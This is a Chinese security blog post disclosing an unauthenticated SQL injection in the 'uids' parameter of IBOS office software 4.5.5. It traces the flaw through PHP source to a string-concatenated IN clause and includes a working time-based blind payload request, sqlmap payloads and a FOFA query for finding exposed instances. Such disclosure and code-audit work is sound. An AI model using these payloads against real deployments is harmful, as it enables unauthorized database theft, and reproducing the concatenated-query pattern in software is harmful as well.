---
title: "IBOS企业协同管理软件 main/api/OrgUser SQL注入漏洞"
source: https://mrxn.net/jswz/IBOS-main-api-orguser-uids-sqli.html
asset_dir: assets/ibos企业协同管理软件-mainapiorguser-sql注入漏洞
---

# IBOS企业协同管理软件 main/api/OrgUser SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/13 08:30
- 859浏览
- [0评论](#comment)
- 1小时阅读

深入探索

JSON处理工具

防火墙软件

云安全解决方案

---

# 漏洞简介

深圳市博思协创网络科技有限公司开发的IBOS企业协同管理[软件](#)是一款基于Yii和bootstrap的开源OA/协同办公平台，连接全平台覆盖的酷办公客户端的企业办公平台，旨在提升企业内部沟通协作效率，实现工作流程的优化和数据管理的便捷。其系统main/api/orguser 接口存在SQL注入漏洞，未授权攻击者可利用此漏洞获取系统数据库数据。

物流软件安全

# 影响版本

4.5.5

# fofa语法

> `app="IBOS企业协同管理软件"`

# 漏洞分析

根据漏洞路径搜索直接找到了相关js(static/js/app/ibos.userData.js#L226)，可知传参 uids

```
getUserInfo: function(ids, callback) {
                var data, deptInfo, posInfo,
                    url = Ibos.app.url('main/api/orguser');

                $.post(url, {
                    uids: ids
                }, function(res) {
                    if (res.isSuccess) {
                        data = res.data;
                        callback && callback.call(null, data);
                    } else {
                        Ui && Ui.tip('无法获取成员信息', 'warning');
                        return false;
                    }
                }, 'json');
            },
```

继续看 Ibos.app.url 的实现，发现其系统路由获取如下 /static/js/src/common.js#L713

SQL注入防护

```
    /**
     * 获取路由
     * @method url
     * @param  {String} route   由三个子参数组成的字符： 模块/控制器/动作
     * @param {Object} [param]  作为url参数的对象，{a: 1, b: 1}将解析为 a=1&b=1的格式
     * @example 
     *          Ibos.app.url('main/default/index');
     *          // ==> localhost/?r=main/default/index
     *          Ibos.app.url('main/default/index', { op: "add" });
     *          // ==> localhost/?r=main/default/index&op=add
     *          
     * @return {String}          Url地址
     */
    app.url = function(route, param) {
        route += "";
        if ((route).split("/").length !== 3) {
            // $.error("app.url: 参数route错误");
        } else {
            param = param ? '&' + $.param(param) : '';
            return this.g("SITE_URL") + "?r=" + route + param;
        }
    };
```

因此根据这个直接定位 /system/modules/main/controllers/ApiController.php 里的 actionOrgUser() 函数

代码安全审计

```
    public function actionOrgUser()
    {
        $uids = Env::getRequest('uids');
        $uidArray = StringUtil::getUidAByUDPX($uids);
        $userArray = User::wrapUserInfo($uidArray, false, false);
        $return = array();
        $index = 0;
        foreach ( $userArray as $user ) {
                $return[$index]['id'] = 'u_' . $user['uid'];
                $return[$index]['text'] = $user['realname'];
                $return[$index]['mobile'] = $user['mobile'];
                // 头像小尺寸
                $return[$index]['avatar_small'] = Org::getDataStatic( $user['uid'], 'avatar', 'small' );
                // 头像中尺寸
                $return[$index]['avatar_middle'] = Org::getDataStatic( $user['uid'], 'avatar', 'middle' );
                // 头像大尺寸
                $return[$index]['avatar_big'] = Org::getDataStatic( $user['uid'], 'avatar', 'big' );
                $return[$index]['spaceurl'] = '?r=user/home/index&uid=' . $user['uid'];
                $return[$index]['department'] = empty( $user['deptname'] ) ? '' : $user['deptname'];
                $return[$index]['position'] = empty( $user['posname'] ) ? '' : $user['posname'];
                $return[$index]['role'] = empty( $user['rolename'] ) ? '' : $user['rolename'];
                $return[$index]['deptid'] = empty( $user['deptid'] ) ? 'c_0' : 'd_' . $user['deptid'];
                $return[$index]['positionid'] = empty( $user['positionid'] ) ? '' : 'p_' . $user['positionid'];
                $return[$index]['roleid'] = empty( $user['roleid'] ) ? '' : 'r_' . $user['roleid'];
                $index++;
        }
        return $this->ajaxReturn(array(
            'isSuccess' => true,
            'data' => $return,
        ));
    }
```

继续跟进 getUidAByUDPX 函数 system/core/utils/StringUtil.php#L645

漏洞预警服务

```
    /**
     * 通过'u_1,d_1,p_1,r_1'或者array('u_1','d_1','p_1','r_1')这样的字符串或者数组获取uid
     * @param array|string $udpX
     * @return array
     */
    public static function getUidAByUDPX($udpX, $findC = false, $returnDisable = false, $returnRelated = true)
    {
        $udpA = is_array($udpX) ? $udpX : explode(',', $udpX);
        if ($findC) {
            $diff = array_intersect($udpA, array('c_0', 'alldept'));
            if (!empty($diff)) {
                return User::model()->fetchUidA($returnDisable);
            }
        }
        $uidA = $uArray = $dArray = $pArray = $rArray = array();
        foreach ($udpA as $row) {
            $pre = substr($row, 0, 1);
            if (strcmp($pre, 'u') == 0) {
                $uArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'd') == 0) {
                $dArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'p') == 0) {
                $pArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'r') == 0) {
                $rArray[] = substr($row, 2);
            }
        }
        if (!empty($uArray)) {
            $uidA = array_merge($uidA, $uArray);
        }
        if (!empty($dArray)) {
            $uidFromD = User::model()->fetchAllUidByDeptids($dArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromD);
        }
        if (!empty($pArray)) {
            $uidFromP = User::model()->fetchAllUidByPositionIds($pArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromP);
        }
        if (!empty($rArray)) {
            $uidFromR = User::model()->fetchAllUidByRoleids($rArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromR);
        }
        return array_unique($uidA);
    }
```

getUidAByUDPX() 通过处理输入的 $udpX（可以是字符串或数组）

网络安全

最终调用 fetchAllUidByDeptids 以及 generateInCondition 处理 where 语句后，执行SQL，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

```
public static function generateInCondition($columnName, array $valueArr)
    {
        $ids = implode("','", $valueArr);
        $condition = sprintf("%s IN ('%s')", $columnName, $ids);

        return $condition;
    }

public function fetchAllUidByDeptids($deptids, $returnDisabled = true, $related = false)
{
    $deptIdArr = !is_array($deptids) ? explode(',', $deptids) : $deptids;
    $condition = util\StringUtil::generateInCondition('`u`.`deptid`', $deptIdArr);
    $query = Ibos::app()->db->createCommand();
    if (true === $related):
        $query = $query->leftJoin(DepartmentRelated::model()->tableName() . ' dr'
            , " `dr`.`uid` = `u`.`uid` ");
        $condition2 = util\StringUtil::generateInCondition('`dr`.`deptid`', $deptIdArr);
        $condition = array(
            'OR',
            $condition,
            $condition2,
        );
    endif;
    if (false === $returnDisabled):
        $condition = array(
            'AND',
            $condition,
            " `u`.`status` != '" . self::USER_STATUS_ABANDONED . "'",
        );
    endif;
    $uidArray = $query->selectDistinct('u.uid')
        ->from($this->tableName() . ' u')
        ->where($condition)
        ->queryColumn();
    return $uidArray;
}
```

因此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用只需要闭合单引号和左括号即可。

搜索引擎

# 漏洞复现

会执行两次，一般延时时间为你的 payload 两倍时间

```
GET /?r=main/api/orguser&uids=u_1')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(3)))a)%20AND%20('222'%3D'222 HTTP/1.1
Host: ibos.mrxn.net
```

sqlmap 结果

```
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uids=u_1') AND 2138=2138 AND ('ajshx'='ajshx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uids=u_1') AND (SELECT 6501 FROM (SELECT(SLEEP(4)))SrQj) AND ('HSYx'='HSYx
---
```

# 参考

- `https://github.com/fzbTech/IBOS.new`
- `https://gitee.com/ibos/IBOS`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
